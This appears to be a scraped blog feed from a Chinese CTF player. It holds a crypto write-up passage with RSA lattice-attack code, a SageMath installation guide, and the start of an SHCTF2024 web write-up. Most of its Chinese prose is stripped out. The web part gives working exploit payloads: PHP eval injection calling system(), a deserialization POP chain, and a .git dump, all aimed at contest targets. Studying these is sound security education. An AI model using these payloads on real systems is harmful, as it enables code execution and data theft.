</span><br><span class="line"><span class="comment"># remove N^j</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    Lii = L[i][i]</span><br><span class="line">    N_Power = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (Lii % N == <span class="number">0</span>):</span><br><span class="line">        N_Power *= N</span><br><span class="line">        Lii //= N</span><br><span class="line">    L[i][i] = Lii</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        <span class="keyword">if</span> (j != i):</span><br><span class="line">            L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))</span><br><span class="line"> </span><br><span class="line">L = Matrix(ZZ, L)</span><br><span class="line">nrows = L.nrows()</span><br><span class="line"> </span><br><span class="line">L = L.LLL()</span><br><span class="line"><span class="comment"># Recover poly</span></span><br><span class="line">reduced_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]</span><br><span class="line">    reduced_polynomials.append(g_l)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eliminate z</span></span><br><span class="line">my_ideal_list = [y * z - N] + reduced_polynomials</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Variety</span></span><br><span class="line">my_ideal_list = [Hi.change_ring(QQ) <span class="keyword">for</span> Hi <span class="keyword">in</span> my_ideal_list]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_ideal_list),<span class="number">3</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)</span><br><span class="line">    <span class="keyword">if</span> V:</span><br><span class="line">        p = <span class="built_in">int</span>(V[<span class="number">0</span>][<span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">        q = N//p</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>crtrsa</code><code>dp</code></p><p></p><h2 id="unsolved"><a class="markdownIt-Anchor" href="#unsolved"></a> UNSOLVED</h2><h3 id="polyprime-pcb2024"><a class="markdownIt-Anchor" href="#polyprime-pcb2024"></a> polyprime-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">k = getPrime(<span class="number">333</span> * <span class="number">5</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_calc</span>(<span class="params">x</span>): </span><br><span class="line">    <span class="keyword">return</span> (x * random.randint(<span class="number">2</span>, <span class="number">5</span>)) ^ random.randint(<span class="number">100</span>, <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">some_calc</span>(<span class="params">size, depth</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sums_calc</span>(<span class="params">base, degree</span>): </span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degree): </span><br><span class="line">            temp = temp_calc(base ** i)</span><br><span class="line">            result += base ** i + temp // temp_calc(base**(i + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime_number = getPrime(size)</span><br><span class="line"></span><br><span class="line">        temp_number = temp_calc(prime_number)</span><br><span class="line">        poly_primes = sums_calc(prime_number, depth)  </span><br><span class="line">        <span class="keyword">if</span> temp_number % <span class="number">3</span> == <span class="number">0</span>: </span><br><span class="line">            temp_number = temp_calc(poly_primes)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> isPrime(poly_primes):</span><br><span class="line">            <span class="keyword">return</span> prime_number, poly_primes</span><br><span class="line"></span><br><span class="line">p, q = some_calc(<span class="number">333</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n = p * q * k</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 659401821142664131364043958430747314465977448744532421905138184036743766362324320051729418680079590835903781525157600055608268591994754328563246418114269690475272262915661210669701969695314157602927462228079044905276064391615467601628466982949165371933147600418057089432876120807721483665788557812323607370950442342057254926375842684430119320789097029996211564275310819486004520088130146630452262340185192110066151930586956190499953220051855668474863659201165952231016814569364299000130323859609047687714260776467149437031397019411599103716200258382231589757031469168245396061619327867355414287059363691024984066070128364157490336808211223714816668548049472199794493895870662970541167490686648385211854469386812214775829776376273299648505880034651930322294605482489225723014758138525637864689594748771025870209444029669477294995691067669374491852721622469656239730320092112222948718027850386898461208936333788173263904607181823233002355650353116486156927403178510412091666951574340730799316032588099237</span></span><br><span class="line"><span class="comment"># c = 455042981325030540026829365098432813829591020497037525707600104817313008442900331256387443469027825344761381076471749826547710666806180999603254398722965179851898391700090501419875562919365894255855734276825027850795202733875071307773598881254863911398285400038957998385685292965812925607278232164067624548120378758414574370042945538632864154772437639053907149514588502689277630450575630168099810584842881257614115970132960679023265157277718654731105815060916800751033956715430930381384344469220951638102432198422350425390757155267143393385221465041749156153517556389417033187856017198907366720281408810250981776112815100319814215140919133440637395953567624057248002125277569474190364142291136361144552953540727462623677375371327473687508344483184466522697912317252462246054471196345909304668083637177166153036111122244170846815657389873986264187766636830907458940128844256504176917204131708083105093700023335939233711693409336968008112511482237441198116493965744903995545941700742865846469036763734618</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br></pre></td></tr></table></figure><h3 id="rickroll-pcb2024"><a class="markdownIt-Anchor" href="#rickroll-pcb2024"></a> rickroll-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HINT = ?</span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">EFFECTIVE_ROW = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rickroll_loader</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rickroll&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = [line.strip().encode() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ezprime</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime = getPrime(size)</span><br><span class="line">        <span class="keyword">if</span> isPrime(prime // <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_encrypt</span>(<span class="params">message_parts, hint_value</span>):</span><br><span class="line">    modulus = find_ezprime(<span class="number">260</span>)</span><br><span class="line"></span><br><span class="line">    key_material = os.urandom(<span class="number">32</span>)</span><br><span class="line">    multipliers = [getrandbits(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(EFFECTIVE_ROW)]</span><br><span class="line"></span><br><span class="line">    encrypted_parts = [</span><br><span class="line">        <span class="built_in">int</span>((multiplier * hint_value + bytes_to_long(xor(pad(chunk, <span class="number">32</span>)</span><br><span class="line">            [::-<span class="number">1</span>], key_material))) % (modulus - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> multiplier, chunk <span class="keyword">in</span> <span class="built_in">zip</span>(multipliers, message_parts)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_parts, multipliers, modulus</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    rickroll = rickroll_loader()</span><br><span class="line">    m = bytes_to_long(HINT)</span><br><span class="line"></span><br><span class="line">    encrypted_lyrics, multipliers, modulus = secure_encrypt(</span><br><span class="line">        rickroll[:EFFECTIVE_ROW], m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;S =&quot;</span>, encrypted_lyrics)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;V =&quot;</span>, multipliers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, modulus)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">S = [624073892368439332713131144655355187273652775732037030273908973687487472640419, 1129513550732743550887354593625951854836036688324123410864182971141396110133306, 1117643028354341949186759218964558582164677605237787761003042032239935547551873, 151619055620013230556169740951169935393567570823439146992800622058967940011364, 596106506159944398847755500086869373163910176213091804211992440336880292610397, 685472210701608040945173323626153641749419080165879222271110177606156013942182]</span></span><br><span class="line"><span class="string">V = [100024809269721744282017864103544473542698741247649693420201028956644193231147, 85493218764912449360009112267171851264674952927507787108286827385372626006804, 75451455656190167222034904545925816909383290106210237096763781707294423744719, 1864420400658866895837249178680154965580281261003086054650703872439476331244, 111069754111223622246512532174936637994215526100226395068812327641951277359169, 88031405587803201423744918486788030404029698214504194443110805396831023823738]</span></span><br><span class="line"><span class="string">n = 1497114501625523578039715607844306226528709444454126120151416887663514076507099</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rickroll</span></span><br><span class="line"></span><br><span class="line">Never gonna give you up</span><br><span class="line">Never gonna let you down</span><br><span class="line">Never gonna run around <span class="keyword">and</span> desert you</span><br><span class="line"></span><br><span class="line">Never gonna make you cry</span><br><span class="line">Never gonna say goodbye</span><br><span class="line">Never gonna tell a lie <span class="keyword">and</span> hurt you</span><br><span class="line"></span><br><span class="line">--A mysterious singer who does <span class="keyword">not</span> want to be named.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="end"><a class="markdownIt-Anchor" href="#end"></a> END</h2><p><code>Lst4r</code>QWQ<br /></p><p><code>web</code>AK<br /><a href="https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/">https://infernity.top/2024/11/09/2024webwp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;h2 id=&quot;solved&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#solved&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SageMath10.x</title>
    <link href="https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/"/>
    <id>https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/</id>
    <published>2024-11-06T17:47:23.000Z</published>
    <updated>2024-11-20T18:55:41.386Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p><code>windows11</code><code>Sagemath9.3</code><code>wsl2+ubuntu22.04</code><code>sagemath9.5</code><code>exp</code><code>Sagemath10.x</code></p><p><code>WSL2+ubuntu22.04+sagemath10.x</code><code>Arch Linux</code></p><p></p><p><code>Kimi</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SageMath 10.x  Arch Linux </span><br><span class="line">SageMathSage 10.2Arch Linux SageMathSageMath</span><br><span class="line">Arch Linux  SageMath SageMath </span><br><span class="line">Arch Linux </span><br><span class="line"></span><br><span class="line"> Arch Linux  SageMath Arch Linux  SageMath  WSL2 </span><br><span class="line">Arch Linux SageWindowsUNIXArch LinuxUNIX-likeSageMath</span><br><span class="line"></span><br><span class="line">SageMath Arch Linux  pacman  SageMath </span><br><span class="line"></span><br><span class="line">Arch Linux SageMath SageMath 10.x </span><br></pre></td></tr></table></figure><p><code>Arch Linux</code><strong></strong><br /><a href="https://tover.xyz/p/SageMath-10-1-Installation/"></a><code>conda</code></p><h1 id="wsl2arch-linux"><a class="markdownIt-Anchor" href="#wsl2arch-linux"></a> wsl2+Arch Linux</h1><p><code>wsl2</code></p><p><code>Arch WSL</code><br /><code>wsl -d Arch</code><code>Arch Linux</code></p><p><code>wsl --list</code><code> Linux  Windows </code><br /><code>Arch</code><code>Ubuntu-22.04</code><br /><code>wsl --set-default Arch</code></p><h1 id="pacman"><a class="markdownIt-Anchor" href="#pacman"></a> pacman</h1><p>()<br />pacman()<br /><code>sudo su</code><code>root</code><br /><code>vim /etc/pacman.d/mirrorlist</code><br /></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = http://repo.archlinuxcn.org/<span class="variable">$arch</span></span><br><span class="line">Server = http://mirrors.163.com/archlinux-cn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.aliyun.com/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p><code>pacman -Syu</code>()</p><p><code>pacman key</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure><p><code>pacman -Syu</code><code>pacman key</code></p><p>()<code>Could not resolve host</code><code>DNS</code>(?)<code>vim /etc/resolv.conf</code><code>nameserver 8.8.8.8</code><code>DNS</code><code>nameserver 114.114.114.114</code>()</p><p><code>Arch Linux</code>(ubuntu)<code>/etc/resolv.conf</code><code>Arch Linux</code><code>DNS</code></p><p><code>archlinuxcn</code><code>vim /etc/pacman.conf</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p><code>archlinuxcn</code><code>key</code><code>pacman -Sy archlinuxcn-keyring</code></p><p><code>key</code>(?)</p><p><code>sage</code></p><h1 id="sage"><a class="markdownIt-Anchor" href="#sage"></a> sage</h1><p><code>sudo pacman -Sy sagemath</code><br /><strong>G</strong><br /><code>sage</code><br /><img src="https://picx.zhimg.com/80/v2-700679ee72ed9b6dd33bbfcc1c956af7_1440w.png" alt="" /><br /><br /><code>sage</code><code>Arch\usr\lib\python3.12\site-packages\sage</code></p><h1 id="jupyterlab"><a class="markdownIt-Anchor" href="#jupyterlab"></a> JupyterLab()</h1><p><code>sudo pacman -S jupyterlab</code></p><h1 id="jupyterlabsage"><a class="markdownIt-Anchor" href="#jupyterlabsage"></a> JupyterLabSage</h1><p><code>sage -n jupyterlab --allow-root</code><br /><code>Edge</code></p><p><code>http://localhost:8888/lab</code><br /><code>bash</code><br /><code>/mnt/d/desktop</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">vim sage.sh</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">sage -n jupyterlab --allow-root</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">chmod</span> +x sage.sh</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">./sage.sh</span><br></pre></td></tr></table></figure><p><code>sagemath</code><code>./sage.sh</code></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo pacman -S python-&lt;package_name&gt; [python-&lt;package_name&gt;]</span></span><br><span class="line"><span class="comment"># Archpippip3</span></span><br><span class="line">sudo pacman -S python-gmpy2 python-pycryptodome python-pwntools python-tqdm</span><br></pre></td></tr></table></figure><p><code>python</code><code>python-xxxx</code><code>pip</code>(ctf crypto)</p><p><code>windows</code><code>pwntools</code><code>from pwn import *</code></p><p><code>Linux</code><code>pwntools</code>()<code>Linux</code><code>python</code><code>Arch Linux</code><code>pwntools</code></p><p><code>crypto</code></p><p>()</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">p = remote(<span class="string">&#x27;host&#x27;</span>, port)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">a = p.recvline()</span><br><span class="line">p.recvlines(n)</span><br><span class="line">p.recvall()</span><br><span class="line">p.recv(n)   <span class="comment"># n</span></span><br><span class="line">p.recvuntil(delim)  <span class="comment"># delim</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">p.send(string)</span><br><span class="line">p.sendafter(string,payload) <span class="comment"># string</span></span><br><span class="line">p.sendline(string)    <span class="comment">#    \n</span></span><br><span class="line">p.sendlineafter(string,payload)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>b'hello'</code></p><h1 id="flatter"><a class="markdownIt-Anchor" href="#flatter"></a> flatter()</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gmp mpfr eigen base-devel gcc git cmake</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/keeganryan/flatter.git</span><br><span class="line"><span class="built_in">cd</span> flatter</span><br><span class="line"><span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> ./build</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>flatter -h</code></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p><code>Setting-&gt;Setting Editer-&gt;Code Completion</code><br /><img src="https://picx.zhimg.com/80/v2-94dfe83b491d36a5837bfb8a7be17f6c_1440w.webp" alt="" /><br /><br /><img src="https://picx.zhimg.com/80/v2-2bd85de9329534e40610f5c15c15c6a7_1440w.png" alt="" /><br /></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p><a href="https://shinichicun.top/posts/arch%E4%B8%8B%E7%9A%84sage%E5%AE%89%E8%A3%85/">https://shinichicun.top/posts/archsage/</a><br /><a href="https://zhuanlan.zhihu.com/p/633782050">https://zhuanlan.zhihu.com/p/633782050</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#&quot;&gt;&lt;/a&gt; &lt;/h1&gt;
&lt;p&gt;&lt;code&gt;windows11&lt;/code&gt;&lt;code&gt;Sagemath9.3&lt;/code&gt;&lt;cod</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SHCTF2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/</id>
    <published>2024-11-04T17:40:17.000Z</published>
    <updated>2025-04-02T18:13:44.985Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ctf.qlu.edu.cn">https://ctf.qlu.edu.cn</a><br /></p><p><code>newstar 0xgame</code></p><p></p><p><img src="https://picx.zhimg.com/80/v2-522c0facffd34af1c7527ec7ebcda698_1440w.png" alt="" /><br />37</p><h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><p><code>game.js</code></p><h3 id="1zflask"><a class="markdownIt-Anchor" href="#1zflask"></a> 1zflask</h3><p><code>/robots.txt</code><code>/s3recttt</code><code>/api?SSHCTFF=cat /flag</code></p><h3 id=""><a class="markdownIt-Anchor" href="#"></a> ?!</h3><p><code>/source.txt</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ququ&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ququ&#x27;</span>]) != <span class="number">415411</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="variable">$eval_param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strncmp</span>(<span class="variable">$eval_param</span>,<span class="string">&#x27;ququk1&#x27;</span>,<span class="number">6</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ququ&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fault\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;fault&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/check.php?ququ=114514%00</code>post<code>ququ=ququk1;system(&quot;cat /flag&quot;);</code></p><h3 id="ez_gittt"><a class="markdownIt-Anchor" href="#ez_gittt"></a> ez_gittt</h3><p><code>git</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install GitHacker</span><br><span class="line">githacker --url http://entry.shc.tf:45317/.git/ --output-folder result</span><br><span class="line"><span class="built_in">cd</span> result/cb5763aae21e1c5821db1b400953e7f1/.git</span><br><span class="line">git diff 1b2133e98f25813443f66f845153fa0c1c33fd1b 8dd1651ac6dc576566720781e603a606d9cea330</span><br></pre></td></tr></table></figure><h3 id="poppopop"><a class="markdownIt-Anchor" href="#poppopop"></a> poppopop</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SH</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Web</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$SHCTF</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;p)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        SH::<span class="variable">$Web</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SH::<span class="variable">$SHCTF</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHCTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isyou</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&quot;cat /flllag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SH::<span class="variable">$Web</span>) &#123;</span><br><span class="line"></span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;isyou)(<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;~&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;n=<span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;n-&gt;o=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;n-&gt;o-&gt;p=<span class="keyword">new</span> <span class="title function_ invoke__">SHCTF</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h3 id="jvav"><a class="markdownIt-Anchor" href="#jvav"></a> jvav</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Runtime</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> runtime.exec(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 